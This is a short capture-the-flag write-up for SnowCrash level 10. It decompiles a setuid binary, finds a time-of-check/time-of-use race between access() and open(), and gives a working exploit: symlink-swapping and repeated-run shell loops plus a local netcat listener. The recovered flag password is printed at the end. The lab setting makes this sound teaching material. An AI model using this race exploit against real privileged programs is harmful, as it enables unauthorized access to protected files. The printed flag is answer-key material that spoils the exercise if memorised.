# Level 10

## The Challenge

The folder contains a binary named level10 owned by flag10. The setuid and setgid bits are set. There is also a file named token owned by flag10. Groups and others have no rights on token. level10 takes two arguments, a filename and an host address.
The idee seems to be to let level10 open for us the token file and display its content at the host address. But level10 claims that we don't have access to token :(

```sh
level10@SnowCrash:~$ ls -al
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
level10@SnowCrash:~$
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
level10@SnowCrash:~$
```

## Decompile the code

... with dogbolt.org

```c
v1 = v0[1];
v2 = v0[2];
if (access(v0[1], 4))
{
    v14 = printf("You don't have access to %s\n");
}
```

...

```c
v4 = open(v1, 0, 8);
```

## The target

level10 check the rights on the file given as argument using the acces function. access check wether the real user id (here level10 ; the effective user id being flag10) have read right on a file.
access have a well known weakness:

man access(2)

```
 Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.
```

The idee is to provide as argument a random file on which level10 has the rights. Then switch it with token after the check with access and prior to the opening. Therefore we run a loop who switch a symbolic link between a genuine file we own and token and in parallel a loop who run level10 with the symbolic link as argument.

## The hack

listen in one terminal

```sh
$ while true ; do netcat -l 127.0.0.1 6969; done
```

run the loops in another one

```sh
$ touch /tmp/mykey
$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
$ killall bash
```

flag10 password: woupa2yuojeeaaed06riuj63c
